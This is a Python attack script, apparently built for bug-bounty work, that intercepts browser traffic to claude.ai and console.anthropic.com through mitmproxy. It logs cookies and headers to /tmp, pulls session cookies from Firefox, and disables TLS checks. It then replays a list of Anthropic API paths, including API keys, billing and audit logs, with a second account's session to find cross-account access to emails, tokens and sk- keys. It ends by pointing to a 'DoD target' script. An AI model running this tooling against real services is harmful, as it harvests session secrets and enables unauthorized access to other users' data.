#!/usr/bin/env python3
"""
AmonStrike — API Interceptor
Automatically captures all API calls from browser
and tests each one with Account 2 session.
No manual Network tab needed.

Uses: mitmproxy to intercept, analyze, and cross-test
every API call made by the browser.
"""

import json, re, time, subprocess, shutil
from pathlib import Path


MITM_SCRIPT = '''
import json, re
from mitmproxy import http, ctx

TARGET_DOMAINS = ["claude.ai", "console.anthropic.com", "api.anthropic.com"]
API_PATTERNS   = [r"/api/", r"/v1/", r"/graphql"]
CAPTURED       = []

def response(flow: http.HTTPFlow):
    host = flow.request.pretty_host
    path = flow.request.path
    
    # Only capture API calls to target domains
    if not any(d in host for d in TARGET_DOMAINS):
        return
    if not any(re.search(p, path) for p in API_PATTERNS):
        return
    if flow.response.status_code not in [200, 201]:
        return
    
    entry = {
        "method":  flow.request.method,
        "url":     flow.request.pretty_url,
        "status":  flow.response.status_code,
        "size":    len(flow.response.content),
        "cookies": dict(flow.request.cookies),
        "headers": dict(flow.request.headers),
        "body":    flow.response.text[:500],
    }
    CAPTURED.append(entry)
    
    # Save to file for scanner to pick up
    with open("/tmp/amonstrike_captured.json", "w") as f:
        json.dump(CAPTURED, f, indent=2)
    
    ctx.log.info(f"[CAPTURED] {flow.request.method} {path} -> {flow.response.status_code} ({len(flow.response.content)}b)")
'''


class APIInterceptor:
    """
    Runs mitmproxy as transparent proxy.
    Captures all API calls from browser.
    Tests each with second account.
    """

    def __init__(self, port: int = 8082):
        self.port        = port
        self.script_path = Path("/tmp/amonstrike_mitm.py")
        self.capture_path= Path("/tmp/amonstrike_captured.json")
        self.process     = None

    def start(self):
        """Start mitmproxy."""
        if not shutil.which("mitmdump"):
            print("""
[!] mitmproxy not installed. Install:
    pip3 install mitmproxy --break-system-packages
    
Then run Firefox through it:
    export https_proxy=http://127.0.0.1:8082
    firefox &
""")
            return False

        self.script_path.write_text(MITM_SCRIPT)
        self.process = subprocess.Popen([
            "mitmdump",
            "-p", str(self.port),
            "-s", str(self.script_path),
            "--quiet",
        ])
        print(f"[+] Proxy started on port {self.port}")
        print(f"[+] Configure Firefox: Settings → Network → Manual proxy → HTTP: 127.0.0.1:{self.port}")
        print(f"[+] Or run: export https_proxy=http://127.0.0.1:{self.port} && firefox")
        return True

    def get_captured(self) -> list:
        """Get captured API calls."""
        if self.capture_path.exists():
            return json.loads(self.capture_path.read_text())
        return []

    def stop(self):
        if self.process:
            self.process.terminate()


class CrossAccountTester:
    """
    Tests every captured endpoint with Account 2 session.
    Fully automated IDOR detection.
    """

    def __init__(self, session2_cookies: dict):
        self.cookies2 = session2_cookies

    def test_all(self, captured: list) -> list:
        import requests, urllib3
        urllib3.disable_warnings()

        findings = []
        s2 = requests.Session()
        s2.verify = False
        s2.cookies.update(self.cookies2)
        s2.headers["User-Agent"] = "Mozilla/5.0"

        print(f"\n[*] Testing {len(captured)} captured endpoints with Account 2...")

        for entry in captured:
            url    = entry["url"]
            method = entry["method"]
            body1  = entry["body"]

            try:
                if method == "GET":
                    r2 = s2.get(url, timeout=10)
                else:
                    r2 = s2.post(url, timeout=10)

                status2 = r2.status_code
                body2   = r2.text[:300]

                # Compare responses
                if status2 == 200:
                    # Check if data differs (different account data)
                    sensitive = self._find_sensitive(body2)
                    if sensitive:
                        findings.append({
                            "title":    f"IDOR — Endpoint accessible by Account 2: {url}",
                            "severity": "HIGH",
                            "url":      url,
                            "evidence": f"Account 1 data: {body1[:200]}\nAccount 2 gets: {body2[:200]}",
                            "sensitive_fields": sensitive,
                            "poc":      f'curl -sk "{url}" -H "Cookie: sessionKey=ACCOUNT2_KEY"',
                        })
                        print(f"  [!!!] POTENTIAL IDOR: {url}")
                        print(f"        Sensitive fields: {sensitive}")
                    else:
                        print(f"  [200] {url[:60]} — no sensitive data")
                else:
                    print(f"  [{status2}] {url[:60]}")

            except Exception as e:
                pass

        return findings

    def _find_sensitive(self, text: str) -> list:
        found = []
        patterns = {
            "email":   r'"(?:email|email_address)"\s*:\s*"([^"@]+@[^"]+)"',
            "name":    r'"(?:full_name|display_name)"\s*:\s*"([^"]{2,50})"',
            "uuid":    r'"uuid"\s*:\s*"([a-f0-9-]{30,})"',
            "api_key": r'"(?:key|api_key)"\s*:\s*"(sk-[^"]{20,})"',
            "token":   r'"(?:token|access_token)"\s*:\s*"([^"]{20,})"',
        }
        for field, pat in patterns.items():
            if re.search(pat, text, re.I):
                found.append(field)
        return found


class BrowserAPICapture:
    """
    Alternative: directly replay known API paths
    using Account 1 session to discover real endpoints,
    then test with Account 2.
    No proxy needed.
    """

    KNOWN_PATHS = [
        # Claude.ai
        "/api/bootstrap",
        "/api/account",
        "/api/organizations",
        "/api/organizations/{org}/settings",
        "/api/organizations/{org}/members",
        "/api/organizations/{org}/entitlements",
        "/api/organizations/{org}/chat_conversations",
        "/api/organizations/{org}/projects",
        "/api/organizations/{org}/skills/list-skills",
        "/api/organizations/{org}/claude_code/user_settings",
        "/api/claude_code/organizations/{org}/user_settings",
        "/api/organizations/{org}/feature_flags",
        "/api/organizations/{org}/integrations",
        "/api/organizations/{org}/invites",
        "/api/organizations/{org}/usage_breakdown",
        "/api/me",
        "/api/sync/state",
        # Console.anthropic.com
        "/api/organizations/{org}/api_keys",
        "/api/organizations/{org}/billing",
        "/api/organizations/{org}/billing/usage",
        "/api/organizations/{org}/billing/invoices",
        "/api/organizations/{org}/rate_limits",
        "/api/organizations/{org}/workspaces",
        "/api/organizations/{org}/audit_logs",
    ]

    def __init__(self, target: str, org_id: str,
                 cookies1: dict, cookies2: dict):
        self.target   = target
        self.org_id   = org_id
        self.cookies1 = cookies1
        self.cookies2 = cookies2

    def run(self) -> list:
        import os
        # Ensure we check both root and user firefox profiles
        os.environ.setdefault("HOME", "/root")
        import requests, urllib3
        urllib3.disable_warnings()

        findings = []
        base     = self.target.rstrip("/")
        console  = "https://console.anthropic.com"

        s1 = requests.Session()
        s1.verify = False
        s1.cookies.update(self.cookies1)
        s1.headers["User-Agent"] = "Mozilla/5.0"
        s1.headers["X-HackerOne-Handle"] = "jardani101"

        s2 = requests.Session()
        s2.verify = False
        s2.cookies.update(self.cookies2)
        s2.headers["User-Agent"] = "Mozilla/5.0"
        s2.headers["X-HackerOne-Handle"] = "jardani101"

        print(f"\n[*] Testing {len(self.KNOWN_PATHS)} endpoints...")

        for path in self.KNOWN_PATHS:
            path = path.replace("{org}", self.org_id)

            # Try both domains
            for b in [base, console]:
                url = b + path
                try:
                    r1 = s1.get(url, timeout=8, allow_redirects=False)

                    # Skip if Account 1 can't access it
                    if r1.status_code != 200:
                        continue
                    if len(r1.text) < 10:
                        continue

                    # Now test with Account 2
                    r2 = s2.get(url, timeout=8, allow_redirects=False)

                    sens1 = self._sensitive(r1.text)
                    sens2 = self._sensitive(r2.text)

                    status_str = f"A1={r1.status_code} A2={r2.status_code}"

                    if r2.status_code == 200 and sens2:
                        # Check if different account data
                        uid1 = re.search(r'"uuid"\s*:\s*"([a-f0-9-]{30,})"', r1.text)
                        uid2 = re.search(r'"uuid"\s*:\s*"([a-f0-9-]{30,})"', r2.text)

                        if uid1 and uid2 and uid1.group(1) == uid2.group(1):
                            print(f"  [SAME] {path[:50]} | {status_str}")
                            continue

                        findings.append({
                            "title":    f"IDOR — Cross-account access: {path}",
                            "severity": "CRITICAL" if "api_key" in sens2 else "HIGH",
                            "url":      url,
                            "evidence": (
                                f"A1({r1.status_code}): {r1.text[:200]}\n"
                                f"A2({r2.status_code}): {r2.text[:200]}"
                            ),
                            "sensitive": sens2,
                            "poc": (
                                f'curl -sk "{url}" '
                                f'-H "Cookie: sessionKey=ACCOUNT2_SESSION"'
                            ),
                        })
                        print(f"  [!!!] IDOR: {path} | {status_str} | {sens2}")

                    elif r2.status_code == 200 and not sens2:
                        print(f"  [200/200] {path[:50]} — no sensitive data in A2")
                    else:
                        print(f"  [{r2.status_code}] {path[:50]}")

                except Exception:
                    pass

        return findings

    def _sensitive(self, text: str) -> list:
        found = []
        for field, pat in {
            "email":   r'"(?:email|email_address)"\s*:\s*"[^"@]+@[^"]+"',
            "name":    r'"(?:full_name|display_name)"\s*:\s*"[^"]{2,}"',
            "api_key": r'"(?:key|api_key)"\s*:\s*"sk-[^"]+"',
            "token":   r'"token"\s*:\s*"[^"]{20,}"',
            "org_data":r'"organization"\s*:\s*\{',
        }.items():
            if re.search(pat, text, re.I):
                found.append(field)
        return found


if __name__ == "__main__":
    import sys
    sys.path.insert(0, ".")

    from core.session_manager import SessionManager
    sm = SessionManager()

    # Grab both sessions
    c1 = sm._grab_from_browser("claude.ai")
    c2 = sm._grab_from_browser("console.anthropic.com")

    if not c1:
        print("[!] Login to claude.ai in Firefox first")
        sys.exit(1)

    # Get org_id
    import requests, urllib3
    urllib3.disable_warnings()
    s = requests.Session()
    s.verify = False
    s.cookies.update(c1)
    r = s.get("https://claude.ai/api/bootstrap", timeout=10)
    org_id = ""
    if r.status_code == 200:
        d = r.json()
        memberships = d.get("account", {}).get("memberships",
                          d.get("memberships", []))
        if memberships:
            org_id = memberships[0].get("organization", {}).get("uuid", "")

    print(f"Org ID: {org_id}")

    # Run automated cross-account test
    tester = BrowserAPICapture(
        "https://claude.ai", org_id, c1, c2
    )
    findings = tester.run()

    print(f"\n=== RESULTS: {len(findings)} findings ===")
    for f in findings:
        print(f"\n[{f['severity']}] {f['title']}")
        print(f"URL: {f['url']}")
        print(f"PoC: {f['poc']}")
        print(f"Evidence: {f['evidence'][:200]}")

    if not findings:
        print("\nNo IDOR found. Anthropic auth is solid.")
        print("Try switching to DoD target: sudo bash dod_expand.sh")
